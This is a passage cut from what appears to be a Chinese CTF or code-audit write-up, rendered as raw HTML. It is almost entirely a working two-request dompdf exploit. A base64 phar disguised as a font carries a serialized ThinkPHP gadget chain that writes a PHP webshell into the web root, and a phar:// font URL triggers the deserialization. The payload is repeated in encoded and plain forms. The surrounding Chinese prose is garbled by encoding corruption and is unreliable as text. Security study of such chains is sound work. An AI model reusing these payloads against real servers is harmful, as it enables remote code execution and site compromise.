class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 1 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_da94a27b825aeca64e86b19a3972972d.ttf##&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>å°†====== REQUEST 1 ENCODED =======å…ˆå†™å…¥phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ contentæ˜¯å› ä¸ºå®¡è®¡æºç çš„æ—¶å€™å‘ç°</p><p><img src="../images/image-20230426203507788.png" alt="image-20230426203507788"></p><p><img src="../images/image-20230426203522154.png" alt="image-20230426203522154"></p><p><img src="../images/image-20230426203609835.png" alt="image-20230426203609835"></p><p>çŸ¥é“è¿™äº›ä»¥åï¼Œå°±å¯ä»¥å»å°è¯•postå‚æ•°äº†</p><p><img src="../images/image-20230426203735353.png" 